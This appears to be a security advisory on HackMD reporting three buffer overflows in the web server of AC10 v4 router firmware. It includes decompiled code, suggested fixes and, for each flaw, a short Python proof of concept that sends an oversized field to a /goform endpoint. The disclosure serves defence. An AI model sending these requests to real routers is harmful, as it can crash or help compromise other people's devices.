

# 1. Buffer Overflow in Virtual\_Data\_Check
## Affected model(s) and firmware/software version(s)
Product: AC10 v4
Version: US\_AC10V4.0si\_V16.03.10.20\_cn
Binary: `/bin/httpd`
## Vulnerability description and potential impacts
In `formSetVirtualSer`, it reads value of key `list` upto 0x200 bytes and passed as argument to function `Virtual\_Data\_Check`:
```c
memset(acStack\_514, 0, 0x100);
memset(auStack\_414, 0, 0x201);
memset(auStack\_210, 0, 0x201);
iVar1 = websSafeGetVar(param\_1, 0xcc, "list", & DAT\_004fb6b8, auStack\_414);
if (iVar1 == 1) {
printf("Error: Get WEB value failed, idx[%d],var[%s]\n", 0xcc, & DAT\_004fb6bc);
websTransfer\_errCode(param\_1, 1);
} else {
memcpy(auStack\_210, auStack\_414, 0x201);
iVar1 = Virtual\_Data\_Check(auStack\_210);
if (iVar1 == 0) {
save\_virtualser\_data("adv.virtualser", auStack\_414, 0x7e);
```
In `Virtual\_Data\_Check`, it uses sscanf with format string `%[^,]` and `%s` to parse from param1 to 4 local variables. But the `list` can take upto 0x200, which will cause buffer overflow:
```c
undefined4 Virtual\_Data\_Check(char \* param\_1)
{
...
local\_198 = param\_1;
if ( \* param\_1 == '\0') {
uVar3 = 0;
} else {
while (pcVar4 = strchr(local\_198, L '~'), pcVar4 != 0x0) {
...
}
iVar5 = sscanf(local\_198, "%[^,],%[^,],%[^,],%s", & local\_168, & local\_138, & local\_128, & local\_118);
...
}
return uVar3;
}
```
## Step-by-step instructions to reproduce the issue
- Step 1: Run httpd
- Step 2: Run the script in the next section with first argument is ip of server
## Proof-of-concept (PoC) or exploit code for the issue
```python
#!/usr/bin/python3
import sys
import requests
payload = b'2,'\*3
payload = payload.ljust(0x200, b'A')
def run():
url = f"http://{sys.argv[1]}/goform/SetVirtualServerCfg"
data = {
'list': payload,
}
res = requests.post(url=url,data=data)
run()
```
![formSetVirtualSer](https://hackmd.io/\_uploads/HklQiZCe0.gif)
## Any suggested solutions to fix this
Reduce max size in `websSafeGetVar` for "list"
## Severity (e.g. CVSS v3.x)
Buffer Overflow, possible command injection
## Acknowledgement
Cao Ngoc Quy, Nguyen Huu Tri and Nguyen Le Quoc Anh of bl4ckh0l3 from Galaxy One
## Assigned CVE
Not yet
# 2. Buffer Overflow in route\_static\_check
## Affected model(s) and firmware/software version(s)
Product: AC10 v4
Version: US\_AC10V4.0si\_V16.03.10.20\_cn
Binary: `/bin/httpd`
## Vulnerability description and potential impacts
In `fromSetRouteStatic`, it reads value of key `list` upto 0x200 bytes and passed as argument to function `Virtual\_Data\_Check`:
```c
memset(acStack\_514, 0, 0x100);
memset(auStack\_414, 0, 0x201);
memset(auStack\_210, 0, 0x201);
iVar1 = websSafeGetVar(param\_1, 0xcb, "list", & DAT\_004fb850, auStack\_414);
if (iVar1 == 1) {
printf("Error: Get WEB value failed, idx[%d],var[%s]\n", 0xcb, & DAT\_004fb854);
websTransfer\_errCode(param\_1, 1);
} else {
memcpy(auStack\_210, auStack\_414, 0x201);
iVar1 = route\_static\_check(auStack\_210);
if (iVar1 == 0) {
save\_staticroute\_data ("adv.staticroute", auStack\_414, L’~’);
```
In route\_static\_check, it uses sscanf with format string `%[^,]` and `%s` to parse from param1 to 4 local variables. But the "list" can take upto 0x200, which will cause buffer overflow:
```c
undefined4 route\_static\_check(char \* param\_1)
{
...
local\_58 = param\_1;
if ( \* param\_1 == '\0') {
uVar1 = 0;
} else {
while (pcVar2 = strchr(local\_58, L '~'), pcVar2 != 0x0) {
...
}
iVar3 = sscanf(local\_58, "%[^,],%[^,],%[^,],%s", & local\_4c, & local\_3c, & local\_2c, & local\_1c);
...
}
return uVar1;
}
```
## Step-by-step instructions to reproduce the issue
- Step 1: Run httpd
- Step 2: Run the script in the next section with first argument is ip of server
## Proof-of-concept (PoC) or exploit code for the issue
```python
#!/usr/bin/python3
import sys
import requests
payload = b'2,'\*3
payload = payload.ljust(0x200, b'A')
def run():
url = f"http://{sys.argv[1]}/goform/SetStaticRouteCfg"
data = {
'list': payload,
}
res = requests.post(url=url,data=data)
run()
```
![fromSetRouteStatic](https://hackmd.io/\_uploads/SyoEj-AeR.gif)
## Any suggested solutions to fix this
Reduce max size in `websSafeGetVar` for "list"
## Severity (e.g. CVSS v3.x)
Buffer Overflow, possible command injection
## Acknowledgement
Cao Ngoc Quy, Nguyen Huu Tri and Nguyen Le Quoc Anh of bl4ckh0l3 from Galaxy One
## Assigned CVE
Not yet
# 3. Possible Buffer Overflow in fromSysToolChangePwd
## Affected model(s) and firmware/software version(s)
Product: AC10 v4
Version: US\_AC10V4.0si\_V16.03.10.20\_cn
Binary: `/bin/httpd`
## Vulnerability description and potential impacts
In fromSysToolChangePwd, it gets SYSOPS from request without limited the length:
```c
sysops = websGetVar(param\_1, "SYSOPS", & DAT\_004fd3e0);
sysps = websGetVar(param\_1, "SYSPS", & DAT\_004fd3e0);
sysps2 = websGetVar(param\_1, "SYSPS2", & DAT\_004fd3e0);
GetValue("sys.userpass", & local\_2c);
iVar1 = strcmp( & local\_2c, sysops);
if ((iVar1 != 0) || (iVar1 = strcmp(sysps, sysps2), iVar1 != 0)) {
websRedirect(param\_1, "/system\_password.html?1");
return;
}
iVar1 = strcmp(sysops, sysps);
if (iVar1 == 0) {
websRedirect(param\_1, "/system\_password.html");
return;
}
SetValue("sys.userpass", sysps);
```
It first executes `GetValue` to get current password and compares to make sure the current password is correct, then it saves new password using `SetValue`. But because new password (which is `SYSPS`) isn’t limited in length so after we set new password, we execute `fromSysToolChangePwd` again, it gets current password via `GetValue` and can cause buffer overflow for `local\_2c` variable.
## Step-by-step instructions to reproduce the issue
- Step 1: Run httpd
- Step 2: Run the script in the next section with first argument is ip of server and second argument is old password
## Proof-of-concept (PoC) or exploit code for the issue
```python
#!/usr/bin/python3
import sys
import requests
payload = b'A'\*0x200
def run():
url = f"http://{sys.argv[1]}/goform/SysToolChangePwd"
data = {
"SYSOPS": sys.argv[2],
"SYSPS": payload,
"SYSPS2": payload
}
requests.post(url=url, data=data)
requests.post(url=url, data=data)
run()
```
## Any suggested solutions to fix this
Check password length before save
## Severity (e.g. CVSS v3.x)
Possible Buffer Overflow, possible command injection
## Acknowledgement
Cao Ngoc Quy, Nguyen Huu Tri and Nguyen Le Quoc Anh of bl4ckh0l3 from Galaxy One
## Assigned CVE
Not yet

×
### Sign in

Email

Password

[Forgot password](https://hackmd.io/settings/forgotPassword)

or

By clicking below, you agree to our [terms of service](https://hackmd.io/s/terms).

[Sign in via Facebook](https://hackmd.io/auth/facebook)
[Sign in via Twitter](https://hackmd.io/auth/twitter)
[Sign in via GitHub](https://hackmd.io/auth/github)
[Sign in via Dropbox](https://hackmd.io/auth/dropbox)
![](https://hackmd.io/images/wallet.svg)
Sign in with Wallet

Wallet
(

)
Connect another wallet

New to HackMD? [Sign up](https://hackmd.io/join)

